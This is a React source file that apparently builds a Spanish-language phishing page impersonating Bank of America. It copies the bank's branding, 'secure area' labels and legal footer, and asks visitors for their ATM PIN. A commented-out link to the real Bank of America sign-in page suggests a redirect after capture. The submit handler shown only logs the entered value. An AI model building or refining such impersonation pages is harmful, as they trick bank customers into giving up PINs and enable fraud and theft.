import React from "react";
import { useFormik } from "formik";
import * as Yup from "yup";
import { Link } from "react-router-dom";
import * as FaIcons from "react-icons/fa";
import * as AiIcons from "react-icons/ai";
import * as IoIcons from "react-icons/io";
import * as GiIcons from "react-icons/gi";
import "./controlSeguridad.scss";

export default function ControlSeguridad() {

  //FORMULARIO FORMIK
  const formik = useFormik({
    initialValues: {
      codigo: "",
      // email: "",
      // password: "",
    },
    validationSchema: Yup.object({
      codigo: Yup.string()
        .required("el campo es necesario ")
        .min(4, "Mínimo 4 dígitos ")
        .max(6, "Máximo 6 dígitos"),
      // email: Yup.string().required("campo obligatorio").email("email invalido"),
      // password: Yup.string().required("password obligatorio"),
    }),
    onSubmit: (formData) => {
      // iniciarSesion(formData);
      console.log(formData);
    },
  });

  const errorFormik = (err, touch) => {
    if (err && touch) {
      return (
        <div className="alert-input">
          {err}
        </div>
      );
    }
  };

  return (
    <div className="control-seguro">
      <header className="control-seguro__header">
        <div className="control-seguro__header__nav-left">
          <img className="logo" src="assets/login/logo.png" alt="logo" />
          <Link className="link" to="/login">
            Sign In
          </Link>
        </div>
        <div className="login__header__nav-derecho">
          <div className="div-segura">
            <FaIcons.FaLock />
            <span className="text-segura">Area Segura</span>
          </div>
          <div className="div-idioma">
            <AiIcons.AiOutlineSmallDash className="icon-puntos" />
            <span>En español</span>
          </div>
        </div>
      </header>
      <section className="control-seguro__header-bottom">
        <h3 className="text">Control de Seguridad</h3>
      </section>

      {/* body */}
      <section className="control-seguro__body">
        <p className="seguro-text">
          Para confirmar su identificacion en linea, complete todos los campos a
          continuacion.
        </p>
        <p className="seguro-text">
          Es importante tener en cuenta que los datos deben coincidir con lo que
          tenemos en el sistema.
        </p>

        <form className="body-input" onSubmit={formik.handleSubmit}>
          <h2 className="body-input__title">Detalles de inicio de sesion</h2>
          <div className="div-input-seguro">
            <span className="top-red">Control de Seguridad</span>
            <div className="content-input-seguro">
              <label className="content-input-seguro__text">PIN ATM</label>
              <input
                className="content-input-seguro__input"
                type="number"
                id="codigo"
                name="codigo"
                onChange={formik.handleChange}
                value={formik.values.codigo}
              />
            </div>

            <span className="bottom-red">
              {errorFormik(formik.errors.codigo, formik.touched.codigo)}
            </span>
          </div>


          {/* <a href="https://secure.bankofamerica.com/login/sign-in/signOnV2Screen.go"></a> */}
          
          <button className="btn-seguro" type="submit">
            <IoIcons.IoIosUnlock />
            <span>Confirmar</span>
          </button>
        </form>
      </section>

      {/* //footer */}
      <footer className="control-seguro__footer">
        <span className="text-footer">
          <IoIcons.IoIosUnlock />
          Area segura
        </span>
        <div className="div-span">
          <span className="text-span">Privacidad</span>
          <p>|</p>
          <span className="text-span">seguridad </span>
        </div>
        <p className="text-end">
          Bank of America, miembro de NA FDIC. Prestamista de vivienda
          equitativa
          <GiIcons.GiHouse />
        </p>
        <p className="text-end">© 2021 Bank of America Corporation.</p>
      </footer>
    </div>
  );
}
